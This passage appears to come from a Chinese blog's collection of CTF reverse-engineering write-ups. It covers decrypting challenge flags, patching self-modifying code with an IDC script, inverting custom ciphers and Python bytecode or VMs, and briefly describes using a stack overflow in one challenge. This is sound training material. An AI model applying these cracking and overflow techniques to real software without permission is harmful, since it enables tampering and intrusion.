Encoding.Unicode.GetBytes(TestClick.encryptKey); byte[] array = Convert.FromBase64String(str); DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write); cryptoStream.Write(array, 0, array.Length); cryptoStream.FlushFinalBlock(); byte[] bytes2 = memoryStream.ToArray(); cryptoStream.Close(); memoryStream.Close(); result = Encoding.Unicode.GetString(bytes2); } catch { result = str; } return result;} 只是将flag在base64解码后，使用了DES进行解密，注意使用的是CBC模式 查看EncryptData和encruptKey，得到密文为 11Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA== 密钥为1234 注意，在C#中，字符串默认是Unicode字符串，所以转成字节数组，在每个字符字节后都要加一个”\\x00” 进行解密： 12345678import base64from Crypto.Cipher import DESkey = b&quot;1\\x002\\x003\\x004\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到He_P1ay_Basketball_Very_We11!Hahahahaha!ࠈࠈࠈࠈ 然而提交并不是flag，查看大佬的wp后才发现密文和密钥被更换了 用Cheat Engine搜索字符串“Emmmm”，发现有两处 跟进其中一处看，发现有新的base64字符串，可能是真正的密文 进行解密 12345678910import base64from Crypto.Cipher import DESkey = b&quot;t\\x00e\\x00s\\x00t\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher = b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;#cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到flag:flag{She_P1ay_Black_Hole_Very_Wel1!LOL!XD!}","link":"/2022/02/17/Reverse-3/"},{"title":"Reverse 5","text":"摸鱼摸鱼，只有一题 [ACTF新生赛2020]Splendid_MineCraft一道smc类的题目 放进ida unk_4051DB为函数，相关内存经红框内代码修改 其中的strtok函数： 在此处下断点，开始动调 可以看到，运行过程中，代码在变化 读一下汇编可以发现，其实是将esi+0x1F~esi+0x1F+0x151这段代码进行异或 利用IDC(shift+f2)修改，附上IDC脚本 12345678910#include &lt;idc.idc&gt;static main(){ auto addr=0x4051DD+0x1F; auto i; for(i=0;i&lt;=0x151;i++){ PatchByte(addr+i,Byte(addr+i)^0x72); }} 得到比较漂亮的函数 这部分主要是将两个字符串异或然后加35，然后与输入的字符串作比较。 然后就可以获得第一段字符串：yOu0y* 第二部分打开OD动调，在0x00cb12ac处的jmp eax处下断点，开始运行 输入：ACTF{yOu0y*_123456_111111} 开始部分是将输入放到一段内存中 然后是将输入与0x83+i异或，并把结果作为数组下标来得到一定值 通过跟踪eax指向的地址，得到数组的值 将bl和cl比较，不相等的话则会失败，说明cl是最终加密得到的值 第二部分的结果也可以得到了： 1234567891011121314151617181920212223242526a=[ 0xF6,0xA3,0x5B,0x9D,0xE0,0x95,0x98,0x68,0x8C,0x65,0xBB,0x76,0x89,0xD4,0x09,0xFD, 0xF3,0x5C,0x3C,0x4C,0x36,0x8E,0x4D,0xC4,0x80,0x44,0xD6,0xA9,0x01,0x32,0x77,0x29, 0x90,0xBC,0xC0,0xA8,0xD8,0xF9,0xE1,0x1D,0xE4,0x67,0x7D,0x2A,0x2C,0x59,0x9E,0x3D, 0x7A,0x34,0x11,0x43,0x74,0xD1,0x62,0x60,0x02,0x4B,0xAE,0x99,0x57,0xC6,0x73,0xB0, 0x33,0x18,0x2B,0xFE,0xB9,0x85,0xB6,0xD9,0xDE,0x7B,0xCF,0x4F,0xB3,0xD5,0x08,0x7C, 0x0A,0x71,0x12,0x06,0x37,0xFF,0x7F,0xB7,0x46,0x42,0x25,0xC9,0xD0,0x50,0x52,0xCE, 0xBD,0x6C,0xE5,0x6F,0xA5,0x15,0xED,0x64,0xF0,0x23,0x35,0xE7,0x0C,0x61,0xA4,0xD7, 0x51,0x75,0x9A,0xF2,0x1E,0xEB,0x58,0xF1,0x94,0xC3,0x2F,0x56,0xF7,0xE6,0x86,0x47, 0xFB,0x83,0x5E,0xCC,0x21,0x4A,0x24,0x07,0x1C,0x8A,0x5A,0x17,0x1B,0xDA,0xEC,0x38, 0x0E,0x7E,0xB4,0x48,0x88,0xF4,0xB8,0x27,0x91,0x00,0x13,0x97,0xBE,0x53,0xC2,0xE8, 0xEA,0x1A,0xE9,0x2D,0x14,0x0B,0xBF,0xB5,0x40,0x79,0xD2,0x3E,0x19,0x5D,0xF8,0x69, 0x39 ,0x5F ,0xDB ,0xFA ,0xB2 ,0x8B ,0x6E ,0xA2 ,0xDF ,0x16 ,0xE2 ,0x63 ,0xB1 ,0x20 ,0xCB ,0xBA , 0xEE ,0x8D ,0xAA ,0xC8 ,0xC7 ,0xC5 ,0x05 ,0x66 ,0x6D ,0x3A ,0x45 ,0x72 ,0x0D ,0xCA ,0x84 ,0x4E , 0xF5 ,0x31 ,0x6B ,0x92 ,0xDC ,0xDD ,0x9C ,0x3F ,0x55 ,0x96 ,0xA1 ,0x9F ,0xCD ,0x9B ,0xE3 ,0xA0 , 0xA7 ,0xFC ,0xC1 ,0x78 ,0x10 ,0x2E ,0x82 ,0x8F ,0x30 ,0x54 ,0x04 ,0xAC ,0x41 ,0x93 ,0xD3 ,0x3B , 0xEF ,0x03 ,0x81 ,0x70 ,0xA6 ,0x1F ,0x22 ,0x26 ,0x28 ,0x6A ,0xAB ,0x87 ,0xAD ,0x49 ,0x0F ,0xAF ,]# print(hex(len(a)))result=[0x30,0x04,0x04,0x03,0x30,0x63]flag=''for i in range(len(result)): t=a.index(result[i]) t^=(0x83+i) flag+=chr(t)print(flag)#knowo3 第三部分则在程序流程图中可以找到 最终flag:ACTF{yOu0y*_knowo3_5mcsM&lt;} 参考：ACTF新生赛2020-Splendid_MineCraft - P.Z’s Blog (ppppz.net) [ACTF新生赛2020]Splendid_MineCraft 手把手带你跟汇编！_哔哩哔哩_bilibili 感觉这个up主，感觉讲得很详细，推荐！","link":"/2022/03/20/Reverse-5/"},{"title":"Reverse(4)","text":"[SUSCTF 2022]DigitalCircuits下载附件，发现是python逆向 使用pyinstxtractor处理，得到pyc文件，在扔进在线网站得到代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationimport timedef f1(a, b):#&amp; if a == '1' and b == '1': return '1' return Nonedef f2(a, b):# | if a == '0' and b == '0': return '0' return Nonedef f3(a):# ! if a == '1': return '0' if None == '0': return '1'def f4(a, b):#^ return f2(f1(a, f3(b)), f1(f3(a), b))def f5(x, y, z): s = f4(f4(x, y), z)#s=x^y^z c = f2(f1(x, y), f1(z, f2(x, y)))#c=(x&amp;y)|(z&amp;(x|y)) return (s, c)def f6(a, b): ans = '' z = '0' a = a[::-1] b = b[::-1] for i in range(32): ans += f5(a[i], b[i], z)[0] z = f5(a[i], b[i], z)[1] return ans[::-1]def f7(a, n):#左移n位，右边补0 return a[n:] + '0' * ndef f8(a, n): return n * '0' + a[:-n]#右移n位，左边补0def f9(a, b):#a^b(32位) ans = '' for i in range(32): ans += f4(a[i], b[i]) return ansdef f10(v0, v1, k0, k1, k2, k3): s = '00000000000000000000000000000000' d = '10011110001101110111100110111001' for i in range(32): s = f6(s, d) v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))#f6(v0,f6(v1&lt;&lt;4, k0)^ f6(v1, s)^ f6(v1&gt;&gt;5, k1)) v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))#f6(v1,f6(v0&lt;&lt;4, k2)^ f6(v0, s)^ f6(v0&gt;&gt;5, k3)) return v0 + v1k0 = '0100010001000101'.zfill(32)k1 = '0100000101000100'.zfill(32)k2 = '0100001001000101'.zfill(32)k3 = '0100010101000110'.zfill(32)flag = input('please input flag:')if flag[0:7] != 'SUSCTF{' or flag[-1] != '}': print('Error!!!The formate of flag is SUSCTF{XXX}') time.sleep(5) exit(0)flagstr = flag[7:-1]if len(flagstr) != 24: print('Error!!!The length of flag 24') time.sleep(5) exit(0)res = ''for i in range(0, len(flagstr), 8): v0 = flagstr[i:i + 4] v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8) v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8) res += f10(v0, v1, k0, k1, k2, k3)if res == '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111': print('True')else: print('False')print(res) 阅读代码，发现是加密算法，只不过是用字符串操作代替了位运算（函数f1和f2的代码有点问题，None应该是’0’或’1’）。 加密过程大致如下： 加密三轮，每轮加密8个字节，通过函数f10、f6、f5进行加密，因此主要思想是已知函数结果和输入参数b，对另一个输入参数a进行逆向 对f10的逆向：f10中含有两个状态变量s和d，仔细观察可以发现他们在每一轮的值都是相同的，与输入无关，因此可提前知道它们在每一轮的值。 f10的输出值为v0+v1，即res中的值，因此最后一轮的v0与v1已知 再观察该代码： 1v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3))) 输出v1已知，f6中另一个输入参数为 1f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)) #f6(v0&lt;&lt;4, k2)^ f6(v0, s)^ f6(v0&gt;&gt;5, k3) 此处v0为res中的值，而k2和k3的值不变，因此该参数的值也可以知道，那么问题就是对函数f6进行逆向了 编写解题脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from libnum import n2scip='001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'print(len(cip))def f7(a, n):#左移n位，右边补0 return a[n:] + '0' * ndef f8(a, n): return n * '0' + a[:-n]#右移n位，左边补0def f9(a, b):#a^b(32位) ans = '' for i in range(32): ans += f4(a[i], b[i]) return ansdef f1(a, b):#&amp; if a == '1' and b == '1': return '1' return '0'def f2(a, b):# | if a == '0' and b == '0': return '0' return '1'def f3(a):# ! if a == '1': return '0' if a == '0': return '1'def f4(a, b):#^ return f2(f1(a, f3(b)), f1(f3(a), b))def f5(x, y, z): s = f4(f4(x, y), z)#s=x^y^z c = f2(f1(x, y), f1(z, f2(x, y)))#c=(x&amp;y)|(z&amp;(x|y)) return (s, c)def f6(a, b): ans = '' z = '0' a = a[::-1] b = b[::-1] for i in range(32): ans += f5(a[i], b[i], z)[0] z = f5(a[i], b[i], z)[1] return ans[::-1]s_ =['00000000000000000000000000000000']d_ ='10011110001101110111100110111001'for i in range(32): s_.append(f6(s_[i],d_)) # print(s_[i])k0 = '0100010001000101'.zfill(32)k1 = '0100000101000100'.zfill(32)k2 = '0100001001000101'.zfill(32)k3 = '0100010101000110'.zfill(32)def inv_f10(res): v0=res[:32] v1=res[32:] for i in range(32): v1=inv_f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s_[32-i])), f6(f8(v0, 5), k3))) v0=inv_f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s_[32-i])), f6(f8(v1, 5), k1))) return v0,v1def inv_f6(ans,b): ans=ans[::-1] b=b[::-1] a='' z='0' for i in range(32): a+=f5(ans[i],b[i],z)[0] z=f5(a[i], b[i], z)[1] return a[::-1]def main(): flag='' for i in range(3): res_=cip[i*(len(cip)//3):(i+1)*(len(cip)//3)] v0,v1=inv_f10(res_) flag+=v0 flag+=v1 return int(flag,2)print(n2s(main())) [羊城杯 2020]Bytecode下载附件，发现是python字节码，于是手撸字节码： 利用python中的dis库可以有效地将python代码转换为对应的字节码，如： 12345678910111213141516171819202122232425import disdef func(): a=1 b=2 c=a+b print(c)dis.dis(func)''' 3 0 LOAD_CONST 1 (1) 2 STORE_FAST 0 (a) 4 4 LOAD_CONST 2 (2) 6 STORE_FAST 1 (b) 5 8 LOAD_FAST 0 (a) 10 LOAD_FAST 1 (b) 12 BINARY_ADD 14 STORE_FAST 2 (c) 6 16 LOAD_GLOBAL 0 (print) 18 LOAD_FAST 2 (c) 20 CALL_FUNCTION 1 22 POP_TOP 24 LOAD_CONST 0 (None) 26 RETURN_VALUE''' 个人感觉这篇博客讲的不错：Python逆向（五）—— Python字节码解读 - Blili - 博客园 (cnblogs.com) 一路边看边写，大致写出题目的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import disdef test(): en=[3,37,72,9,6,132] output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60, 106,51,101,178,189,101,48] print('welcome to GWHT2020') flag=input('please input your flag:') str=flag a=len(str) if a&lt;38: if((((ord(str[0])*2020+ord(str[1]))*2020+ord(str[2]))*2020+ord(str[3]))*2020+ord(str[4])==1182843538814603): print(b'good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') x=[] k=5 for i in range(13): b=ord(str[k]) c=ord(str[k+1]) a11=en[i%6]^c a22=en[i%6]^b x.append(a11) x.append(a22) k=k+2 if x==output: print(b'good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') l=len(str) a1=ord(str[l-7]) a2=ord(str[l-6]) a3=ord(str[l-5]) a4=ord(str[l-4]) a5=ord(str[l-3]) a6=ord(str[l-2]) if(a1*3+a2*2+a3*5==1003): if(a1*4+a2*7+a3*9==2013): if(a2*8+a1+a3*2==1109): if(a4*3+a5*2+a6*5==671): if(a4*4+a5*7+a6*9==1252): if(a5*8+a4+a6*2==644): print('congraduation!you get the right flag!') else: print('oh,you are wrong!') exit() else: print('bye') exit() exit()print(dis.dis(test)) 其实也就是将一部分输入和设置好的数组异或，最后再将部分输入放入方程中验证 写出解题脚本： 12345678910111213141516171819202122232425from sympy import *a1=Symbol('a1')a2=Symbol('a2')a3=Symbol('a3')print(solve([a1*3+a2*2+a3*5-1003,a1*4+a2*7+a3*9-2013,a2*8+a1+a3*2-1109],[a1,a2,a3]))#97 101 102a4=Symbol('a4')a5=Symbol('a5')a6=Symbol('a6')print(solve([a4*3+a5*2+a6*5-671,a4*4+a5*7+a6*9-1252,a5*8+a4+a6*2-644],[a4,a5,a6]))#102 55 51flag=chr(97)+chr(101)+chr(102)+chr(102)+chr(55)+chr(51)print(flag)output=[101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60, 106,51,101,178,189,101,48]en=[3,37,72,9,6,132]k=0str=''for i in range(13): str+=chr(en[i%6]^output[k+1]) str+=chr(en[i%6]^output[k]) k+=2print(str)# cfa2b87b3f746a8f0ac5c5963fprint(chr(1182843538814603-(((ord('G')*2020+ord('W'))*2020+ord('H'))*2020+ord('T'))*2020)) 得到flag{cfa2b87b3f746a8f0ac5c5963faeff73}","link":"/2022/02/27/Reverse-4/"},{"title":"Reverse 6","text":"上大分 [TOC] Dig the way一道逆向题，考的是栈溢出hhhh 先大概读一下程序流程，首先会打开文件data，但附件中并没有给出，然后根据文件大小将文件中字符读取到v7_20这个数组中（注意该数组长度只有20） 然后通过函数做了某些处理，符合要求后进入get_key函数，并产生对应flag 那么大致思路就是如何操作使得判断时v9=0，再来看看func_ptr中的三个函数 123456789signed int __cdecl func0(int a1, int a2, int a3){ int temp; // [esp+Ch] [ebp-4h] temp = *(_DWORD *)(4 * a2 + a1); *(_DWORD *)(a1 + 4 * a2) = *(_DWORD *)(4 * a3 + a1); *(_DWORD *)(a1 + 4 * a3) = temp; return 1;} 大概就是交换两个数的值 1234567unsigned int __cdecl func1(int basic_address, int a2, int a3){ return abs32(*(_DWORD *)(4 * a2 + basic_address) + *(_DWORD *)(4 * a3 + basic_address)) - abs32(*(_DWORD *)(4 * a3 + basic_address)) - abs32(*(_DWORD *)(4 * a2 + basic_address)) + 2;} 返回 $|x+y|-|x|-|y|+2$ 1234567unsigned int __cdecl func2(int a1, int a2, int a3){ return abs32(*(_DWORD *)(4 * a3 + a1)) - abs32(*(_DWORD *)(4 * a3 + a1) + *(_DWORD *)(4 * a2 + a1)) + abs32(*(_DWORD *)(4 * a2 + a1)) + 2;} 返回 $|x|+|y|-|x+y|+2$ 在第三轮时，v6=3，v8[v6]恰好就是v9，因此第三个函数的执行将决定了v9的值。 然而在func2中，由不等式$|x|+|y| \\geq |x+y| $可知，该函数最少也会返回2 那么如何解决该问题？思路是利用栈溢出修改函数运行顺序，让第三轮运行func1函数，并令参数一个为2，另一个为-1. 利用读取data文件的溢出漏洞，实现覆盖变量值，并据此写出data文件的内容 得到flag: 8cda1bdbb92900b9291bdb8cda [watevrCTF 2019]Repyc下载得到pyc文件，反编译得到一堆奇怪的代码 变量替换，弄好看点，发现其实是个vm题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationvalue_0 = 0v2 = 1v3 = 2def func1(par1): local1 = 0 local2 = 0 array_0 = [0] * 16 array2 = [0] * 100 local5 = [] while par1[local1][value_0] != 'finish': local6 = par1[local1][value_0] local7 = par1[local1][1:] if local6 == 'addition': array_0[local7[value_0]] = array_0[local7[1]] + array_0[local7[2]] elif local6 == '\\xeb\\xa0\\x80': array_0[local7[value_0]] = array_0[local7[1]] ^ array_0[local7[2]] elif local6 == '\\xeb\\xa0\\xb3': array_0[local7[value_0]] = array_0[local7[1]] - array_0[local7[2]] elif local6 == 'multiple': array_0[local7[value_0]] = array_0[local7[1]] * array_0[local7[2]] elif local6 == '\\xeb\\xa2\\xaf': array_0[local7[value_0]] = array_0[local7[1]] / array_0[local7[2]] elif local6 == '\\xeb\\xa5\\x87': array_0[local7[value_0]] = array_0[local7[1]] &amp; array_0[local7[2]] elif local6 == '\\xeb\\xa7\\xb3': array_0[local7[value_0]] = array_0[local7[1]] | array_0[local7[2]] elif local6 == 'nop': array_0[local7[value_0]] = array_0[local7[value_0]] elif local6 == '\\xeb\\xab\\x87': array_0[local7[value_0]] = array_0[local7[1]] elif local6 == 'LoadParToArray_0': array_0[local7[value_0]] = local7[1] #加载参数到array[0]，参数1为位置，参数2为被加载的参数 elif local6 == '\\xeb\\xab\\xbb': array2[local7[value_0]] = array_0[local7[1]] elif local6 == '\\xeb\\x94\\x93': array_0[local7[value_0]] = array2[local7[1]] elif local6 == '\\xeb\\x8c\\x92': array_0[local7[value_0]] = value_0 elif local6 == '\\xeb\\xac\\x87': array2[local7[value_0]] = value_0 elif local6 == '\\xeb\\xac\\x9f': array_0[local7[value_0]] = input(array_0[local7[1]]) elif local6 == 'getInput': array2[local7[value_0]] = input(array_0[local7[1]]) #input elif local6 == 'printArray_0': print(array_0[local7[value_0]]) elif local6 == '\\xeb\\xad\\x97': print(array2[local7[value_0]]) elif local6 == '\\xeb\\xad\\xbf': local1 = array_0[local7[value_0]] elif local6 == '\\xeb\\xae\\x93': local1 = array2[local7[value_0]] elif local6 == '\\xeb\\xae\\xb3': local1 = local5.pop() elif local6 == '\\xeb\\xaf\\x83' :#or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = local7[value_0] local5.append(local1) continue elif local6 == '\\xea\\xbd\\xb2': array_0[7] = value_0 for i in range(len(array_0[local7[value_0]])): if array_0[local7[value_0]] != array_0[local7[1]]: array_0[7] = 1 local1 = array_0[local7[2]] local5.append(local1) elif local6 == 'stringXOR': local8 = '' for i in range(len(array_0[local7[value_0]])): local8 += chr(ord(array_0[local7[value_0]][i]) ^ array_0[local7[1]]) array_0[local7[value_0]] = local8 elif local6 == 'StringSubtraction': local8 = '' for i in range(len(array_0[local7[value_0]])): local8 += chr(ord(array_0[local7[value_0]][i]) - array_0[local7[1]]) array_0[local7[value_0]] = local8 elif local6 == '\\xeb\\x96\\x87' or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = array_0[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x97\\x8b' or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = array2[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x98\\xb7' or array_0[local7[1]] == array_0[local7[2]]: local1 = local7[value_0] local5.append(local1) continue elif local6 == '\\xeb\\x9a\\xab' or array_0[local7[1]] == array_0[local7[2]]: local1 = array_0[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x9d\\x87' and array_0[local7[1]] == array_0[local7[2]]: local1 = array2[local7[value_0]] local5.append(local1) continue local1 += 1func1([ [ 'LoadParToArray_0', value_0, 'Authentication token: '], #装载该字符串,array[0]='Authentication token: ' [ 'getInput', #获取输入，装载到array2[0] value_0, value_0], [ 'LoadParToArray_0', '\\xc3\\xa1\\xc3\\x97\\xc3\\xa4\\xc3\\x93\\xc3\\xa2\\xc3\\xa6\\xc3\\xad\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\x9b\\xc3\\xa3\\xc3\\xa5\\xc3\\xa4\\xc3\\x89\\xc3\\x96\\xc3\\x93\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x93\\xc3\\x89\\xc3\\x96\\xc3\\x93\\xc3\\xa5\\xc3\\xa4\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x95\\xc3\\xa6\\xc3\\xaf\\xc3\\xa8\\xc3\\xa4\\xc3\\x9f\\xc3\\x99\\xc3\\x9a\\xc3\\x89\\xc3\\x9b\\xc3\\x93\\xc3\\xa4\\xc3\\xa0\\xc3\\x99\\xc3\\x94\\xc3\\x89\\xc3\\x93\\xc3\\xa2\\xc3\\xa6\\xc3\\x89\\xc3\\xa0\\xc3\\x93\\xc3\\x9a\\xc3\\x95\\xc3\\x93\\xc3\\x92\\xc3\\x99\\xc3\\xa6\\xc3\\xa4\\xc3\\xa0\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x93\\xc3\\x89\\xc3\\x9a\\xc3\\x93\\xc3\\xa1\\xc3\\x89\\xc2\\xb7\\xc3\\x94\\xc3\\xa2\\xc3\\x97\\xc3\\x9a\\xc3\\x95\\xc3\\x93\\xc3\\x94\\xc3\\x89\\xc2\\xb3\\xc3\\x9a\\xc3\\x95\\xc3\\xa6\\xc3\\xaf\\xc3\\xa8\\xc3\\xa4\\xc3\\x9f\\xc3\\x99\\xc3\\x9a\\xc3\\x89\\xc3\\x85\\xc3\\xa4\\xc3\\x97\\xc3\\x9a\\xc3\\x94\\xc3\\x97\\xc3\\xa6\\xc3\\x94\\xc3\\x89\\xc3\\x97\\xc3\\x9a\\xc3\\xaf\\xc3\\xa1\\xc3\\x97\\xc3\\xaf\\xc3\\xa5\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\x94\\xc3\\x99\\xc3\\x9a\\xc3\\xa4\\xc3\\x89\\xc3\\xa6\\xc3\\x93\\xc3\\x97\\xc3\\x9c\\xc3\\x9c\\xc3\\xaf\\xc3\\x89\\xc3\\xa0\\xc3\\x97\\xc3\\xa2\\xc3\\x93\\xc3\\x89\\xc3\\x97\\xc3\\x89\\xc3\\x91\\xc3\\x99\\xc3\\x99\\xc3\\x94\\xc3\\x89\\xc3\\xa2\\xc3\\x9f\\xc3\\x94\\xc3\\x89\\xc3\\x96\\xc3\\xa3\\xc3\\xa4\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\xa6\\xc3\\x93\\xc3\\x97\\xc3\\x9c\\xc3\\x9c\\xc3\\xaf\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x9e\\xc3\\x99\\xc3\\xaf\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\xa5\\xc3\\x99\\xc3\\x9a\\xc3\\x91\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\xa0\\xc3\\x99\\xc3\\xa8\\xc3\\x93\\xc3\\x89\\xc3\\xaf\\xc3\\x99\\xc3\\xa3\\xc3\\x89\\xc3\\xa1\\xc3\\x9f\\xc3\\x9c\\xc3\\x9c\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x9e\\xc3\\x99\\xc3\\xaf\\xc3\\x89\\xc3\\x9f\\xc3\\xa4\\xc3\\x89\\xc3\\x97\\xc3\\xa5\\xc3\\xa1\\xc3\\x93\\xc3\\x9c\\xc3\\x9c\\xc2\\x97\\xc3\\x89\\xc3\\xaf\\xc3\\x99\\xc3\\xa3\\xc3\\xa4\\xc3\\xa3\\xc3\\x96\\xc3\\x93\\xc2\\x9a\\xc3\\x95\\xc3\\x99\\xc3\\x9b\\xc2\\x99\\xc3\\xa1\\xc3\\x97\\xc3\\xa4\\xc3\\x95\\xc3\\xa0\\xc2\\xa9\\xc3\\xa2\\xc2\\xab\\xc2\\xb3\\xc2\\xa3\\xc3\\xaf\\xc2\\xb2\\xc3\\x95\\xc3\\x94\\xc3\\x88\\xc2\\xb7\\xc2\\xb1\\xc3\\xa2\\xc2\\xa8\\xc3\\xab'], [ 'LoadParToArray_0', #array0[2]=120 2, 120], [ 'LoadParToArray_0', # array0[4]=15 4, 15], [ 'LoadParToArray_0', #array0[3]=1 3, 1], [ 'multiple', #array0[2]=2*3=6 2, 2, 3], [ 'addition', #array0[2]=135 2, 2, 4], [ 'nop', value_0, 2], [ '\\xeb\\x8c\\x92', #array0[3]=0 3], [ 'stringXOR', #array0[6]=字符串^0 6, 3], [ 'LoadParToArray_0',#array0[0]='Thanks.' value_0, 'Thanks.'], [ 'LoadParToArray_0',#array0[1]='Authorizing access...' 1, 'Authorizing access...'], [ 'printArray_0', value_0], [ '\\xeb\\x94\\x93',# 将输入字符串装载到array_0[0]中 value_0, value_0], [ 'stringXOR',# ^135 value_0, 2], [ 'StringSubtraction',# 输入字符串-15 value_0, 4], [ 'LoadParToArray_0',# array0[5]=19 5, 19], [ '\\xea\\xbd\\xb2', value_0, 6, 5], [ 'printArray_0', #success 1], [ 'finish'], [ 'LoadParToArray_0', #fail 1, 'Access denied!'], [ 'printArray_0', 1], [ 'finish']]) 通过一步步分析可以发现，程序流程是对输入字符串和135异或，然后减15，与目标密文对比判断是否正确 逆一下得到flag:flag{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0} [ctfshow]逆向4一道链表题 拖进IDA，一开始有点懵，找到输入输出的字符串 注意由于不是utf-8编码，需要alt+a改变编码方式（注意关掉微信，不然会调出微信的截图功能） 继续看，点进sub_7FF7211C10E0中查看，一开始是一段类似辗转相除的算法，只是将结果替换为数组中的值 123456789101112131415v2 = 0; input2 = input; if ( input ) { v4 = &amp;v9; do { ++v4; ++v2; v5 = StrangeArray1[input2 + -26 * (input2 / 26)];// 类似辗转相除 input2 /= 26i64; *(v4 - 1) = v5; } while ( input2 ); } 然后是sub_7FF7211C11E0，这段是将上一段的结果异或7后通过链表串联起来，注意联系开始时初始化的那几个dword 12345678910111213_QWORD *__fastcall sub_7FF7211C11E0(char a1){ _QWORD *result; // rax __int64 v3; // rdx result = malloc(0x10ui64); v3 = globalItem1; // 最开始时给global1赋了一块内存，此时v3指向那块内存 globalItem1 = result; // 类似链表的结构 *(v3 + 8) = result; *v3 = a1; result[1] = 0i64; return result;} 最后进到sub_7FF7211C1220()，其实这个函数的功能就是和函数中的数组作比较，然后判断是否成功 123456789101112131415161718192021222324252627282930313233343536373839404142434445void __noreturn sub_7FF7211C1220(){ __int64 v0; // r9 int v1; // ecx __int64 v2; // rdx char v3; // al int v4; // er8 __int64 v5; // r9 char v6; // cl int v7; // eax v0 = globalItem2; // 链表头 v1 = 0; v2 = 0i64; while ( 1 ) { v3 = *v0; v4 = v1 + 1; v5 = *(v0 + 8); if ( v3 != StrangeArray2[v2 - 1] ) v4 = v1; globalItem2 = v5; if ( !v5 ) break; v6 = *v5; v7 = v4 + 1; v0 = *(v5 + 8); if ( v6 != StrangeArray2[v2] ) v7 = v4; globalItem2 = v0; if ( v0 ) { v2 += 2i64; v1 = v7; if ( v2 &lt; 14 ) continue; } goto 